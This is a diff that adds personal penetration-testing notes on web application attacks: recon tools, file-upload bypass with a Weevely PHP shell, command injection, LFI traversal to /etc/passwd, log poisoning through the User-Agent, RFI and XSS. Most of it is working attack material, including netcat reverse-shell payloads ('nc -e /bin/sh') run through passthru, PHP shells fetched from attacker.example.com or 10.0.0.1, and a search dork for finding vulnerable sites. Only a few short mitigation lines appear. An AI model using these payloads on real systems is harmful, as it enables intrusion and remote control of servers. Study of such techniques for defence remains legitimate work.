@@ -1,0 +1,187 @@
+Information gathering:
+
+* Ip Address
+* Domain name info
+* Technologies used
+* Other websites on the same server
+* DNS records
+* Unlisted files, sub domain, directories
+
+https://whois.domaintools.com/
+https://sitereport.netcraft.com/?url=
+https://www.robtex.com/
+https://ping.eu/ns-whois/
+whois <link>
+
+reverse ip:
+https://hackertarget.com/reverse-ip-lookup/
+https://www.site24x7.com/find-ip-address-of-web-site.html
+https://www.yougetsignal.com/tools/web-sites-on-web-server/
+
+All Tools Collection:
+https://web-check.as93.net
+https://www.yougetsignal.com
+https://www.site24x7.com/tools/
+ping.eu
+
+Finding Sobdomain::
+*.abc.com
+https://subdomainfinder.c99.nl/
+https://osint.sh/subdomain/
+
+Tools : knock, subfinder, sublist3r, amass, finddomain
+
+File Directories::
+Tools : dirb, dirsearch, fuff, gobuster
+
+File Upload Vulnerability::
+
+* Simple Types of Vulnerabilities
+* Allow users to upload executable files such as php
+
+Upload shell::
+weevly genarate 1234 shell.php
+upload the file
+weevly <url/path> <password>
+
+* First, find the upload, think like a photo or picture. then upload a PHP file and intercept it. then content type: image/jpeg and modified to jpeg to PHP [shell.php]  and forward it. If the file is uploaded, that means it is a bug.
+
+First, find the upload, think like a photo or picture. then upload a PHP file and intercept it. then content type: image/jpeg and modified to jpeg to PHP [shell.php.jpg] and forward it. If the file is uploaded, that means it is a bug.
+
+Mitigation::
+* Never allow users to upload executables (php,exe)
+* Check the file type and extention
+* Analyzw the uplaoded file itself, recreate it and rename it
+
+Exploitation Code Execution:
+
+* Allows an attacker to execute OS commands
+* Windows or linux commands
+* Can be used to get a reverse shell
+* or uplaod any file using wget command
+* code execution commands attached in the resources.
+
+Payload:
+
+pwd;ls
+pwd|ls
+
+Mitigation:
+
+* Donot use dangerous function
+* Filter use input before execution
+
+LFI:
+
+/proc/self/environ
+/var/log/auth.log
+/var/log/apache2/access.log
+/etc/passwd
+../etc/passwd
+/../etc/passwd
+../../etc/passwd
+/../../etc/passwd
+../../../etc/passwd
+/../../../etc/passwd
+../../../../etc/passwd
+/../../../../etc/passwd
+../../../../../etc/passwd
+/../../../../../etc/passwd
+
+first intercept with burp and go to user agent and modify with <?phpinfo();?> .
+
+user agent : passthru("nc -e /bin/sh <ip> <port>");
+nc -vv -l -p <port>
+
+RFI:
+
+* Similar to local file Inculsio
+* But allows an attaaacker read ANY file from ANY server
+* Execute php fils from other servers on the current server
+* store php files on other servers as..txt
+
+example : index.php?page=http://musabkhan.com
+Dork : inurl:"index.php?page="
+
+This is mainly because if your website is bugged in RFI, you can read any other server file from your server. You can host the txt/html file in your local kali and execute the target server
+
+Example :
+http://example.com/index.php?module=http://server2.example.com/welcome.php
+http://example.com/index.php?module=http://attacker.example2.com/php-reverse-shell.php
+
+method 1 :
+You can save the php file name : evil.php
+$file = $_GET['file'];
+include($file);
+triggerd by : http://example.com/?file=http://attacker.example.com/evil.php
+
+method 2:
+cd /var/www/html [then create any kind of file and go to ifconfig and copy the ip]
+http://example.com/?file=http://10.0.0.1/x.txt
+
+method 3:
+<?php
+passthru("nc <ip> <port>");
+?>
+save to x.txt
+go to terminal and hit: nc -lvp <port>
+http://example.com/?file=http://10.0.0.1/x.txt
+
+method 4:
+<?php
+passthru("nc -e /bin/sh <ip> <port>");
+?>
+save x.txt
+go to terminal and hit: nc -lvp <port>
+http://example.com/?file=http://10.0.0.1/x.txt
+
+
+prevent:
+
+> disable allow_url_fopen&allow_url_include
+> use static file incllusion
+
+XSS::
+
+* Allow an attacker to inject js code into the page.
+* Code is eecuted when the page loads.
+* Code is executed on the client machine not the server
+
+Three main types: Persistent/Stored XSS, Reflected XSS, DOM based XSS
+
+
+Explotation:
+
+Discovering XSS::
+
+* try to inject javascript code into the pages.
+* Test text boxes and url parameters on the form
+https//target.com/page.php?something=something
+
+Reflected XSS:
+* None persistent, not stored
+* Only work if the target bisits a specially crafted URL EX: http://target.com/page.php?something=<script>alert(XSS")</script>
+
+Stored XSS::
+* Persistent stored on the page or DB
+* The injected code is ececuted everytime the page is loaded
+
+Dom Based XSS:
+* Simillar to reflected and stored XSS
+* Can be discovered and exploted similarly
+* Main difference is that it occurs entirely on the client side
+* Payload is never sent to server. No logs, no server side protection
+
+
+HTML Injection:
+* Allow an attacker to inject Html code into the page
+* Code is executed when the page loads.
+* Code is executed on the client machine not the server
+* Similar to XSS but simpler
+* Hints at the existence of an XSS
+
+
+
+
+
+
